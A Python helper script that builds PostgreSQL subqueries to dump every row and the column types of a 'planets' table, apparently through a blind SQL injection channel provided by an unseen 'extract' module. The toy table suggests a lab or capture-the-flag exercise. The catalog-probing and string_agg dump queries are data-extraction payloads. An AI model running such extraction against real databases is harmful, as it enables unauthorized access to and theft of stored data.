"""Dump every planets row as one text blob (id | name | diameter | description) and the
column types.  The earlier attempt silently returned 0 bytes because it asked for
length(octet_length(...)), which is length(integer) -> error -> read as null."""
import extract as E

AGG = ("(SELECT string_agg(id::text||chr(9)||name||chr(9)||diameter_km::text||chr(9)||description,"
       " chr(10) ORDER BY id) FROM planets)")
ODD = ("(SELECT string_agg(p::text||'='||ascii(substr(description,p,1))::text,',' )"
       " FROM planets, generate_series(1,length(description)) p"
       " WHERE octet_length(description)<>length(description))")
TYPES = ("(SELECT string_agg(attname||':'||format_type(atttypid,NULL),', ')"
         " FROM pg_attribute a JOIN pg_class c ON c.oid=a.attrelid"
         " WHERE c.relname='planets' AND a.attnum>0)")
DIA = "(SELECT string_agg(diameter_km::text,';' ORDER BY id) FROM planets)"

if __name__ == "__main__":
    print("[*] desc char counts:", E.num("(SELECT sum(length(description)) FROM planets)"))
    print("[*] agg char length:", E.read_len(AGG, 4000))
    print("[=] types:", E.read_str(TYPES, 200, "types"), flush=True)
    print("[=] odd char codepoints:", E.read_str(ODD, 60, "odd"), flush=True)
    print("[=] diameters:", E.read_str(DIA, 120, "diameters"), flush=True)
    print("[=] full dump:", repr(E.read_str(AGG, 4000, "planets-dump")), flush=True)
